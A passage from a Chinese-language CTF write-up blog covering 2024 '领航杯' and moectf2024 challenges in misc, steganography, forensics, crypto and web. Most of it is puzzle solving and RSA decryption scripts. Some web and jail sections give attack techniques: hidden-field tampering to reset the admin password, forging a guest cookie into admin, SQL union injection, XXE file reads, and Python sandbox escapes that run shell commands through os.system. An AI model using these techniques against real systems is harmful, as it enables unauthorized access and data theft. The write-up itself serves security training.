          enhanced_image.save(output_filename)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;增强后的图像已保存为 <span class="hljs-subst">&#123;output_filename&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发生错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>可以发现图片122*503是个完整的图片</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/output_image_122x503.png" alt="output_image_122x503"></p><p>在线找个网站镜像一下</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/seeme.png" alt="seeme"></p><p>得到的flag用官方的套子</p><p>CnHongKe{youc@n’tseeme}</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="兔兔"><a href="#兔兔" class="headerlink" title="兔兔"></a>兔兔</h3><p>下载文件得到一个图片，查看一下</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/%E5%85%94%E5%85%94.png" alt="兔兔"></p><p>应该是rabbit的编码，这首诗是木兰诗(mulanshi),用在线网站解密一下</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/tutu1.png" alt="tutu1"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="acxi"><a href="#acxi" class="headerlink" title="acxi"></a>acxi</h3><p>打开随便注册一个账号</p><p>然后正常登陆，告诉只有admin才有flag，尝试按get flag得到，没有回显进行抓包</p><p>进行change password看看</p><p>有一串这样的东西</p><p><code>HIDDEN_STATE=18&amp;HIDDEN_HIX=1052267119216&amp;HIDDEN_LANG=0&amp;new_password=</code></p><p><code>1052267119216</code>进行hex的转化得到<code>F5 0002 0270</code>，改为<code>F500010270</code>,再转为十进制得到<code>1052267053680</code>,放入然后随机个密码我输入的为admin</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/acix1.png" alt="acix1"></p><p>然后前端登陆就可以得到flag了</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/acix2.png" alt="acix2"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/ti1.png" alt="ti1"></p><p>点进去是个企业首页试了几个敏感目录有个&#x2F;admin，试了几个敏感用户，不对，想到查看源码提示用户<code>Caster</code>，密码<code>123456</code>直接登进去</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/2.png" alt="2"></p><p>提示权限不够，两个按钮按了也没有用用burp抓包，看到cookie可以解密</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/3.png" alt="3"></p><p>用url解密再进行base64解密后，得到原始cookie为guest，想到把guest换成admin就能登陆</p><p>直接得到flag</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/4.png" alt="4"></p><h3 id="web-sql-xxe"><a href="#web-sql-xxe" class="headerlink" title="web-sql-xxe"></a>web-sql-xxe</h3><p>点进去发现是个用户登录界面</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/web.png" alt="web"></p><p>试了弱密码，失败又回去看题目提示，提示了有sql对题目进行SQL注入后发现能够登录</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/web1.png" alt="web1"></p><p>密码使用联合注入，用户名随意就可以登入，界面提示XXE，POST方式，打开bp抓包</p><p>提示读flag.php</p><p>拿XXE执行伪协议filter读flag.php</p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
      <tag>rce</tag>
      
      <tag>sql</tag>
      
      <tag>rabbit</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2024</title>
    <link href="/2024/10/12/moectf/moectf2024/"/>
    <url>/2024/10/12/moectf/moectf2024/</url>
    
    <content type="html"><![CDATA[<p>个人排名第25，后期就没怎么打了，复盘整理一下。</p><h1 id="0基础入门"><a href="#0基础入门" class="headerlink" title="0基础入门"></a>0基础入门</h1><p>看完pdf，在群里输入识别码，获得flag</p><p><img src="/../../images/moectf/moectf2024/1.png" alt="1"></p><h1 id="安全杂项"><a href="#安全杂项" class="headerlink" title="安全杂项"></a>安全杂项</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>登入网址，按照要求，给luo选择缺勤，其他签到</p><p>注意：完成所有要求再提交</p><h2 id="罗小黑战记"><a href="#罗小黑战记" class="headerlink" title="罗小黑战记"></a>罗小黑战记</h2><p>打开发现是GIF，帧数藏图片，用工具提取内容</p><img src="/../../images/moectf/moectf2024/a.jpeg" alt="a" style="zoom:50%;"><img src="/../../images/moectf/moectf2024/b.jpeg" alt="b" style="zoom:50%;"><img src="/../../images/moectf/moectf2024/c.png" alt="c" style="zoom:75%;"><p>最后扫码得到 <strong>moectf{y0uu6r3th3m0st3r1nth1sf13ld}</strong></p><h2 id="杂项入门指北"><a href="#杂项入门指北" class="headerlink" title="杂项入门指北"></a>杂项入门指北</h2><p>得到海豹图片，尝试多种未果，注意到图片观察。其实有一段莫斯密码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- .<br></code></pre></td></tr></table></figure><p><img src="/../../images/moectf/moectf2024/haibao.png" alt="haibao"></p><p><strong>moectf{H4VE_A_G00D_T1ME}</strong></p><h2 id="ez-F5"><a href="#ez-F5" class="headerlink" title="ez_F5"></a>ez_F5</h2><p>头一次见这种隐写</p><p>先看到属性里面有编码，base32解密得到<code>no_password</code>,010打开进行分析，在里面看到提示</p><p><img src="/../../images/moectf/moectf2024/F5.png" alt="F5"></p><p>网上搜索一下是F5隐写，下载工具，上面的是密码得到flag</p><p><img src="/../../images/moectf/moectf2024/F5-1.png" alt="F5-1"></p><p><strong>moectf{F5_15_s0_lntere5t1n9}</strong></p><h2 id="so-many-‘m’"><a href="#so-many-‘m’" class="headerlink" title="so many ‘m’"></a>so many ‘m’</h2><p>字频统计的题目，写一个脚本出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">char_frequency_sort</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-comment"># 统计每个字符的频率</span><br>    frequency = Counter(text)<br><br>    <span class="hljs-comment"># 按照频率从高到低排序，如果频率相同则按字典序排序</span><br>    sorted_chars = <span class="hljs-built_in">sorted</span>(frequency.items(), key=<span class="hljs-keyword">lambda</span> x: (-x[<span class="hljs-number">1</span>], x[<span class="hljs-number">0</span>]))<br><br>    <span class="hljs-comment"># 拼接成排序后的字符序列</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span>.join(char <span class="hljs-keyword">for</span> char, count <span class="hljs-keyword">in</span> sorted_chars)<br><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-comment"># 测试输入</span><br>text = <span class="hljs-string">&quot;a!&#123;ivlotzkEm&#123;CtsvEpbDkwexsotyMuECs!mvlhmenrhwpMh0leydsMbC#CC&#125;sii&#125;tkb&#125;ugCD&#123;zlEeT#kyC0fbukglpopmaekbEthmjcMdsgkvmTnC&#125;eot#dcf&#123;ec@ccgqpfqMycysMuuou!en#&#123;g0cDmoyxTCMgt&#123;joT&#123;jnl0rhoklCe&#123;n0CnxprydeaTg0r&#123;avkEjckjEsxhaohs&#123;Trbkr!ffqip444uwrc&#125;nnevgtCT&#123;jCipogtipzdeDiqsy44rMfj&#123;MzCw#qwg&#123;T4m&#123;cuk!hwuncxdmddeurtsojakrjC#vTDd&#125;0poTT@c!DftjwuDp@mcuheeDtfao!iEcEq&#125;kcf#Mpcam&#123;mml4i4mpDnedamcwtC0nem&#123;mDotnmp4jf@TpxfqMoiqwtdijDfimmCzmxe#gsTu&#123;poeTEhD!u0anvTTTbbi&#123;q&#125;zapcksMifDlovoeac@&#123;0keh0dg&#123;Mi!@tfftqitmuMoMcuTpmcgnmozyrrv#zfmzmetyxxa0wczE&#125;eoD&#123;xcMnoCuebu0otdusiDknfvo0&#123;fEsMftzT!eoslegbypspC4vkxm#uaf@acuemhMyiDou#at0rfl4a&#125;0ixeEktws&#125;pMCfCigaTafg&#125;ffssmwwuTkTuls0&#123;M@c4e@&#123;D&#123;tuorzmyqptChpngkeCohCCMTwqctinc0mcjemclv@cMoqf00poarte@oqmuysm#mo&#123;et4kcCpcgcT&#125;vD&#125;m!g4&#123;E0!Mol0fpo!&#123;srT0pf&#123;cMuCx0bp&#123;ftTmExcrn&#125;0etonez!@C4tfa4aM00siztb@fomfD#&#123;#tMbo@jgb4CM0dEk0tea4aMCafn&quot;</span><br><br><span class="hljs-comment"># 获取结果并输出</span><br>result = char_frequency_sort(text)<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><h2 id="捂住一只耳"><a href="#捂住一只耳" class="headerlink" title="捂住一只耳"></a>捂住一只耳</h2><p>wav音频，先用audi代开，没发现波纹图的问题，大约在1min的时候会有数字读写，看了hint才猜出，按键盘上字母对应的列行，如63就是字母第六列第三行，即n</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">63 </span><span class="hljs-number">31</span> <span class="hljs-number">43</span> <span class="hljs-number">31</span> <span class="hljs-number">41</span> <span class="hljs-number">52</span> <span class="hljs-number">31</span> <span class="hljs-number">51</span> <span class="hljs-number">71</span> <span class="hljs-number">101</span><br></code></pre></td></tr></table></figure><p>最后的flag为moectf{nevergetup}</p><h2 id="Abnormal-lag"><a href="#Abnormal-lag" class="headerlink" title="Abnormal lag"></a>Abnormal lag</h2><p>这里用adu打开发现多频图里面有内容，需要进行观察得到flag，友情提醒的是字符只有a-f和数字</p><p><img src="/../../images/moectf/moectf2024/lag1.png" alt="lag1"></p><p><img src="/../../images/moectf/moectf2024/lag2.png" alt="lag2"></p><p>尝试后得到moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}</p><h2 id="moejail-lv1"><a href="#moejail-lv1" class="headerlink" title="moejail_lv1"></a>moejail_lv1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls -al /tmp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat /tmp/.therealflag_*&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="moejail-lv2"><a href="#moejail-lv2" class="headerlink" title="moejail_lv2"></a>moejail_lv2</h2><p>用1一样的第一条先查看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls -al /tmp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>发现root权限可以看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/tmp/therealflag_b8c7f31438c67cea772d2ea57dc77918&#x27;</span>).read())<br></code></pre></td></tr></table></figure><h2 id="moejail-lv3"><a href="#moejail-lv3" class="headerlink" title="moejail_lv3"></a>moejail_lv3</h2><p>试了一下lv3,用2的代码可以打通，就不多赘述了</p><h2 id="The-upside-and-down"><a href="#The-upside-and-down" class="headerlink" title="The upside and down"></a>The upside and down</h2><p>010发现是逆转，写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># # 以二进制模式读取文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/a.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>     content = f.read()<br><br> <span class="hljs-comment"># 反转文件内容</span><br>reversed_content = content[::-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/new.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> new_file:<br>      new_file.write(reversed_content)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.readlines()<br><br>lines = [line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines <span class="hljs-keyword">if</span> line.strip()]<br><br><span class="hljs-comment"># 将过滤后的内容写回文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.writelines(lines)<br><br></code></pre></td></tr></table></figure><p>扫一下得到flag</p><p><img src="/../../images/moectf/moectf2024/new.png" alt="new"></p><p><strong><a href="https://balabala_towards:moectf{Fri3nds_d0n't_lie!}//">https://balabala_towards:moectf{Fri3nds_d0n&#39;t_lie!}//</a></strong></p><h2 id="the-secret-of-snowball"><a href="#the-secret-of-snowball" class="headerlink" title="the_secret_of_snowball"></a>the_secret_of_snowball</h2><p>010打开开头改为FFD8，</p><p>得到第一段</p><p>第二段在010底部base64解密拼接得到flag</p><h2 id="解不完的压缩包"><a href="#解不完的压缩包" class="headerlink" title="解不完的压缩包"></a>解不完的压缩包</h2><p>先写脚本得到最后一层压缩包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_zip_file</span>(<span class="hljs-params">zip_name, output_dir</span>):<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>        zipf.extractall(output_dir)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    output_dir = <span class="hljs-string">&quot;.&quot;</span>  <span class="hljs-comment"># 使用当前目录进行解压</span><br>    prev_extracted_file = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        zip_name = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.zip&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(zip_name):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: The file &#x27;<span class="hljs-subst">&#123;zip_name&#125;</span>&#x27; does not exist.&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># Extract the current zip file</span><br>        extract_zip_file(zip_name, output_dir)<br><br>        <span class="hljs-keyword">if</span> prev_extracted_file:<br>            <span class="hljs-comment"># Delete the previously extracted zip file</span><br>            os.remove(prev_extracted_file)<br><br>        prev_extracted_file = zip_name<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All zip files have been extracted and processed.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>根据压缩包名称的提示，crc碰撞</p><p>利用Zipcrack.py进行爆破</p><p>得到key    *<strong>m:#P7j0</strong></p><p>最后解密得到flag</p><p><strong>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</strong></p><h2 id="每人至少300份"><a href="#每人至少300份" class="headerlink" title="每人至少300份"></a>每人至少300份</h2><p>一直在想脚本没看图片，然后利用word文档就行了简单的拼接，扫码得到一串字符,分析一会后发现了是base58加密得到了flag这题之后会有修复题</p><p><img src="/../../images/moectf/moectf2024/300%E9%97%AE%E5%8D%B7.png" alt="300问卷"></p><p>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh&#x2F;&#x2F;&#x2F;key{3FgQG9ZFteHzw7W42}??</p><p>key里面的内容进行解密得到flag.</p><h2 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h2><p><code>/proc/self/fd/3</code></p><h2 id="Find-It"><a href="#Find-It" class="headerlink" title="Find It"></a>Find It</h2><p>orz这题历时写了很长时间，总结就是其实和图片没什么关系，直接看hint</p><p>做题流程：豆包搜索西安带”的”的幼儿园，跳出了吉的堡幼儿园，简单的百度地图搜一下几个位置，发现有个小区有两个吉的堡幼儿园，最后拼写的就是moectf{ji_di_bao_you_er_yuan}</p><h2 id="ez-Forensics"><a href="#ez-Forensics" class="headerlink" title="ez_Forensics"></a>ez_Forensics</h2><p>取证这一块我没这么了解过</p><p>按流程正常输入一些内容就行(毕竟这个比较简单)</p><p>拖入虚拟机使用vol</p><p>常见的先看看什么镜像</p><p><code>vol.py -f ../flag.raw imageinfo</code></p><p>得到镜像折后可以看一下进程</p><p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 pslist</code></p><p>可以注意到cmd.exe，根据题目的提示，我们需要得到cmd里面的flag</p><p>进行cmdscan扫描</p><p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 cmdscan</code></p><p>得到了flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">CommandProcess: conhost.exe Pid: 2268<br>CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset<br>CommandCount: 3 LastAdded: 2 LastDisplayed: 2<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#0 @ 0x330410: echo moectf&#123;WWBGY-TLVC5-XKYBZ&#125; &gt; flag.txt</span><br>Cmd <span class="hljs-comment">#1 @ 0x30cec0: echo SJW7O^%gt8 &gt; flag.txt</span><br>Cmd <span class="hljs-comment">#2 @ 0x3350b0: del flag.txt</span><br>**************************************************<br></code></pre></td></tr></table></figure><h2 id="ctfer2077①"><a href="#ctfer2077①" class="headerlink" title="ctfer2077①"></a>ctfer2077①</h2><p>先扫看看发现没有东西，用steg看一下，发现有一处有一串内容，data分析一下得到flag</p><p><img src="/../../images/moectf/moectf2024/ctfer2077-1.png" alt="ctfer2077-1"></p><p>moectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}</p><h2 id="ctfer2077②"><a href="#ctfer2077②" class="headerlink" title="ctfer2077②"></a>ctfer2077②</h2><p>加密卷用veracrpt进行解密，然后使用DiskGenius进行恢复文件得到一段内容，打开发现没有明显的内容，估计是被删了，去修复一下。有一个小鹤.txt的文件，内容是</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">ulpb vfde hfyz yisi buuima<br>key jqui xxmm vedrhx de qrpb xnxp<br>ulpb ui veyh dazide<br></code></pre></td></tr></table></figure><p>经过分析是双拼打的字，进行简单分析得到key</p><p>shuangpinshizheyangdazide</p><p>加个moectf就是flag</p><h2 id="ctfer2077③"><a href="#ctfer2077③" class="headerlink" title="ctfer2077③"></a>ctfer2077③</h2><p>流量包导出内容，然后upload文件利用foremost解开得到压缩包，解压得到一些文件。</p><p>有个gif动图隐约能看见有字提取一下内容，得到key:C5EZFsC6</p><p>正常用aud打开发现没什么内容，注意是MP3文件，尝试用MP3stego解密</p><p><img src="/../../images/moectf/moectf2024/mp3.png" alt="mp3"></p><p>得到了文件，是brainfuck转text的内容，得到了字符串H5gHWM9b</p><p>解开压缩包是3个txt文件，缩小观察是福尔摩斯小人，上图片</p><p><img src="/../../images/moectf/moectf2024/%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF.png" alt="福尔摩斯"></p><p>挨个对应然后输入就是以下字符串，最后套个moectf{}</p><p>people_dancing_happily</p><h1 id="现代密码学"><a href="#现代密码学" class="headerlink" title="现代密码学"></a><strong>现代密码学</strong></h1><h2 id="现代密码学入门指北"><a href="#现代密码学入门指北" class="headerlink" title="现代密码学入门指北"></a>现代密码学入门指北</h2><p>根据文本写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><br><span class="hljs-comment"># 给定的参数</span><br>p = <span class="hljs-number">197380555956482914197022424175976066223</span><br>q = <span class="hljs-number">205695522197318297682903544013139543071</span><br>n = <span class="hljs-number">40600296529065757616876034307502386207424439675894291036278463517602256790833</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">36450632910287169149899281952743051320560762944710752155402435752196566406306</span><br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算解密指数 d</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># 解密密文 c 得到明文 m</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 将明文 m 转换为字节</span><br>flag = long_to_bytes(m)<br><br><span class="hljs-comment"># 输出解密的结果</span><br><span class="hljs-built_in">print</span>(flag.decode())<br><br></code></pre></td></tr></table></figure><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes, GCD<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, solve<br><br><span class="hljs-comment"># 先定义已知的变量</span><br>c = <span class="hljs-number">5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746</span><br>pq = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462</span><br>qp = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860</span><br>n = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903</span><br>p_q = <span class="hljs-number">279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 恢复 p 和 q</span><br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>equation = x**<span class="hljs-number">2</span> - p_q*x + n<br>solutions = solve(equation, x)<br>p = <span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">0</span>])<br>q = <span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算私钥 d</span><br>d = inverse(e, phi_n)<br><br><span class="hljs-comment"># 解密消息</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Recovered flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="Big-and-small"><a href="#Big-and-small" class="headerlink" title="Big and small"></a>Big and small</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 给定的c, e, n</span><br>c = <span 